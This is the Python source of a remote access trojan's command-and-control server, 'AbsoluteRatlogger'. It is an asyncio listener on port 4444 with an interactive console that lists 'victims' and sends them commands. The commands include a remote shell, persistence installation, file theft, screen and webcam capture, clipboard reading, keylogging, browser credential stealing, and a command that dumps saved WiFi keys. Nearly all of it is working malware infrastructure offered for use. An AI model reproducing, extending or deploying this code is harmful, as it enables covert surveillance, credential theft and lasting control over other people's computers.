#!/usr/bin/env python3
"""
AbsoluteRatlogger C2 Server — async multi-client server with integrated interactive REPL.
The server runs the listener AND the command shell in the same process,
so commands go directly to connected sessions without IPC.
"""
import asyncio
import json
import time
import struct
import hashlib
import logging
import os
import sys
from typing import Dict, Optional

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from server.database import Database
from tools.protocol import *
from tools.crypto import CryptoManager

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("absolutespy.c2")

MAGIC = b"PHNT"

class ClientSession:
    """A connected RAT client."""
    def __init__(self, reader, writer, session_id, db):
        self.reader = reader
        self.writer = writer
        self.session_id = session_id
        self.db = db
        self.crypto = CryptoManager()
        self.encrypted = False
        self.hostname = "unknown"
        self.os = "unknown"
        self.user = "unknown"
        self.ip = writer.get_extra_info("peername", ("?", 0))[0]
        self.last_seen = time.time()
        self.alive = True
        self.response_data = None
        self.response_event = asyncio.Event()
        self.pending_commands = asyncio.Queue()

    async def handshake(self) -> bool:
        try:
            magic = await self.reader.readexactly(4)
            if magic != MAGIC:
                return False

            data = await self._recv_message()
            if not data:
                return False

            reg = json.loads(data)
            self.hostname = reg.get("hostname", "unknown")
            self.os = reg.get("os", "unknown")
            self.user = reg.get("user", "unknown")

            self.crypto.derive_key(reg.get("seed", "absolutespy"))
            self.encrypted = True

            self.db.update_session(self.session_id, {
                "hostname": self.hostname,
                "os": self.os,
                "user": self.user,
                "ip": self.ip,
                "last_seen": time.strftime("%Y-%m-%d %H:%M:%S"),
                "status": "active",
            })

            log.info(f"Session {self.session_id}: {self.hostname}/{self.os} "
                     f"({self.user}@{self.ip})")
            return True
        except Exception as e:
            log.error(f"Handshake failed: {e}")
            return False

    async def _recv_message(self) -> Optional[bytes]:
        try:
            header = await asyncio.wait_for(self.reader.readexactly(12), timeout=1.0)
            magic, cmd_type, data_len = struct.unpack(">4sII", header)
            if magic != MAGIC:
                return None
            data = await self.reader.readexactly(data_len) if data_len else b""
            if self.encrypted:
                data = self.crypto.decrypt(data)
            self._last_cmd_type = cmd_type
            return data
        except asyncio.IncompleteReadError:
            return None
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None

    async def _send_message(self, cmd_type: int, data: bytes) -> bool:
        try:
            if self.encrypted:
                data = self.crypto.encrypt(data)
            header = struct.pack(">4sII", MAGIC, cmd_type, len(data))
            self.writer.write(header + data)
            await self.writer.drain()
            self.last_seen = time.time()
            return True
        except Exception:
            self.alive = False
            return False

    async def send_command(self, cmd_type: int, data: bytes = b"") -> Optional[bytes]:
        """Send a command and wait for the response."""
        if not self.alive:
            return b"error: session not alive"

        await self._send_message(cmd_type, data)

        # Wait for response
        self.response_data = None
        self.response_event.clear()

        try:
            await asyncio.wait_for(self.response_event.wait(), timeout=30.0)
            return self.response_data
        except asyncio.TimeoutError:
            return b"error: command timed out"
        except Exception as e:
            return f"error: {e}".encode()

    async def handle_session(self):
        """Main loop — receive responses and dispatch."""
        if not await self.handshake():
            self.writer.close()
            return

        while self.alive:
            try:
                data = await self._recv_message()
                if data is None:
                    if not self.alive:
                        break
                    continue

                # Store the response
                self.response_data = data
                self.response_event.set()

                # Also store in DB
                try:
                    self.db.store_response(self.session_id, data[:4096])
                except:
                    pass

            except Exception as e:
                log.error(f"Session {self.session_id} recv error: {e}")
                break

        self.db.update_session(self.session_id, {"status": "disconnected"})
        log.info(f"Session {self.session_id} disconnected")
        try:
            self.writer.close()
        except:
            pass


class C2Server:
    """Main C2 server with integrated interactive REPL."""
    def __init__(self, host="0.0.0.0", port=4444, web=False, web_port=8443):
        self.host = host
        self.port = port
        self.web = web
        self.web_port = web_port
        self.db = Database()
        self.sessions: Dict[int, ClientSession] = {}
        self.next_session_id = 1
        self.current_session: Optional[int] = None

    async def handle_client(self, reader, writer):
        session_id = self.next_session_id
        self.next_session_id += 1

        session = ClientSession(reader, writer, session_id, self.db)
        self.sessions[session_id] = session
        self.db.create_session(session_id, session.ip)

        try:
            await session.handle_session()
        except Exception as e:
            log.error(f"Handler error: {e}")
        finally:
            self.sessions.pop(session_id, None)

    async def run(self):
        server = await asyncio.start_server(self.handle_client, self.host, self.port)
        addrs = ", ".join(str(s.getsockname()) for s in server.sockets)
        log.info(f"AbsoluteRatlogger C2 on {addrs}")

        print(f"""
╔══════════════════════════════════════════════════════╗
║              AbsoluteRatlogger C2 Server                    ║
║  Listening on {self.host}:{self.port:<26}║
║  Web dashboard: {'http://0.0.0.0:' + str(self.web_port) if self.web else 'disabled':<28}║
║  Author: @Ethical_Developer                           ║
╚══════════════════════════════════════════════════════╝

Type 'help' for commands. 'sessions' to list victims.
""")

        # Start web dashboard if requested
        if self.web:
            try:
                from server.monitor import WebDashboard
                web = WebDashboard(self.sessions, self.db, self.web_port)
                asyncio.create_task(web.run())
            except ImportError:
                print("[!] aiohttp not installed — web dashboard disabled")
                print("    pip install aiohttp")

        # Start the listener in background
        asyncio.create_task(server.serve_forever())

        # Run interactive REPL in foreground
        await self._repl()

    async def _repl(self):
        """Interactive command loop."""
        loop = asyncio.get_event_loop()

        while True:
            try:
                # Build prompt
                if self.current_session:
                    prompt = f"\nabsolutespy({self.current_session}) > "
                else:
                    prompt = "\nabsolutespy > "

                # Read input (blocking — run in executor)
                line = await loop.run_in_executor(None, lambda: input(prompt))
                line = line.strip()
                if not line:
                    continue

                await self._handle_repl_command(line)

            except EOFError:
                print("\n[*] Exiting...")
                break
            except KeyboardInterrupt:
                print("\n[*] Ctrl+C — type 'exit' to quit")
            except Exception as e:
                print(f"[!] Error: {e}")

    async def _handle_repl_command(self, line: str):
        """Handle a REPL command."""
        parts = line.split()
        cmd = parts[0].lower()

        if cmd in ("help", "h", "?"):
            self._print_help()

        elif cmd in ("exit", "quit", "q"):
            raise EOFError

        elif cmd == "sessions":
            self._print_sessions()

        elif cmd == "use" or cmd == "interact":
            if len(parts) < 2:
                print("Usage: use <session_id>")
                return
            sid = int(parts[1])
            if sid in self.sessions:
                self.current_session = sid
                s = self.sessions[sid]
                print(f"[*] Interacting with session {sid}: {s.hostname}/{s.os}")
            else:
                print(f"[!] Session {sid} not found or not active")

        elif cmd == "back":
            self.current_session = None

        elif cmd == "generate":
            print("[*] Use 'absolutespy.py generate' from another terminal")
            print("    Example: python3 absolutespy.py generate --platform linux --output spy --c2 127.0.0.1:4444 --modules all")

        elif cmd == "web":
            if self.web:
                print(f"[*] Dashboard at http://localhost:{self.web_port}")
            else:
                print("[!] Web dashboard not enabled. Restart with --web flag.")

        elif self.current_session:
            # Route command to the active session
            await self._send_to_session(self.current_session, line)

        else:
            print(f"[!] Unknown command '{cmd}'. Type 'help' or 'use <id>' to interact with a session.")

    def _print_help(self):
        print("""
═══════════════════════════════════════════════════════════
  AbsoluteRatlogger Commands
═══════════════════════════════════════════════════════════

  Server commands:
    sessions              List all active sessions
    use <id>              Interact with a session
    back                  Exit session interaction
    web                   Show web dashboard URL
    generate              Show generate command help
    exit                  Quit server

  Session commands (after 'use <id>'):
    shell <cmd>           Execute shell command
    sysinfo               Get system information
    ps                    List processes
    kill <pid>            Kill process
    persist <method>      Install persistence (crontab/systemd/bashrc/run_key)
    download <path>       Download file from target
    upload <local> <remote>  Upload file
    ls <path>             List directory
    screen                Capture screen
    webcam                Capture webcam
    clipboard             Read clipboard
    wifi                   Dump WiFi profiles + keys
    stealer chrome        Steal browser credentials
    keylog start|stop|dump  Keylogger control
    registry read <path>  Read registry (Windows)
    exit_session          Close client connection
═══════════════════════════════════════════════════════════
""")

    def _print_sessions(self):
        active = [s for s in self.sessions.values()]
        if not active:
            print("[*] No active sessions. Generate a RAT and run it to connect.")
            return
        print(f"\n{'ID':<5} {'Hostname':<20} {'OS':<20} {'User':<15} {'IP':<16}")
        print("-" * 76)
        for s in active:
            print(f"{s.session_id:<5} {s.hostname:<20} {s.os:<20} {s.user:<15} {s.ip:<16}")
        print()

    async def _send_to_session(self, session_id: int, command: str):
        """Send a command to a session and display the response."""
        session = self.sessions.get(session_id)
        if not session or not session.alive:
            print(f"[!] Session {session_id} is not active")
            self.current_session = None
            return

        parts = command.split()
        cmd = parts[0].lower()

        # Map commands to protocol cmd_types and data
        cmd_map = {
            "shell":     (CMD_SHELL, " ".join(parts[1:]) if len(parts) > 1 else ""),
            "sysinfo":   (CMD_SYSINFO, ""),
            "ps":        (CMD_PROCESS, "list"),
            "kill":      (CMD_PROCESS, f"kill {parts[1]}" if len(parts) > 1 else "list"),
            "persist":   (CMD_PERSIST, parts[1] if len(parts) > 1 else "auto"),
            "download":  (CMD_DOWNLOAD, parts[1] if len(parts) > 1 else ""),
            "ls":        (CMD_SHELL, f"ls -la {' '.join(parts[1:]) if len(parts) > 1 else '.'}"),
            "cat":       (CMD_SHELL, f"cat {' '.join(parts[1:])}"),
            "screen":    (CMD_SCREEN, ""),
            "webcam":    (CMD_WEBCAM, ""),
            "clipboard": (CMD_CLIPBOARD, "read"),
            "wifi":      (CMD_SHELL, "netsh wlan show profiles key=clear 2>/dev/null || cat /etc/NetworkManager/system-connections/* 2>/dev/null"),
            "stealer":   (CMD_SHELL, "echo 'use module on client'"),
            "keylog":    (CMD_KEYLOG, parts[1] if len(parts) > 1 else "start"),
            "exit_session": (CMD_EXIT, ""),
            "screenshot":(CMD_SCREEN, ""),
        }

        if cmd not in cmd_map:
            # Unknown — send as shell command
            cmd_type, data = CMD_SHELL, command
        else:
            cmd_type, data = cmd_map[cmd]

        print(f"[*] Sending {cmd}...")
        response = await session.send_command(cmd_type, data.encode())

        if response:
            # Display response
            if cmd in ("download",) and len(parts) > 1:
                # Save downloaded file
                fname = os.path.basename(parts[1])
                save_path = os.path.join(BASE_DIR, "downloads", fname)
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                with open(save_path, "wb") as f:
                    f.write(response)
                print(f"[+] Saved {len(response)} bytes to {save_path}")
            elif cmd in ("screen", "screenshot", "webcam"):
                # Save image
                ext = ".jpg"
                fname = f"{cmd}_{int(time.time())}{ext}"
                save_path = os.path.join(BASE_DIR, "captures", fname)
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                with open(save_path, "wb") as f:
                    f.write(response)
                print(f"[+] Saved {len(response)} bytes to {save_path}")
            else:
                try:
                    text = response.decode("utf-8", "replace")
                    print(text)
                except:
                    print(f"[+] Response: {len(response)} bytes (binary)")

        else:
            print("[!] No response (timeout or error)")

        # Store command in DB
        try:
            self.db.store_command(session_id, command)
        except:
            pass
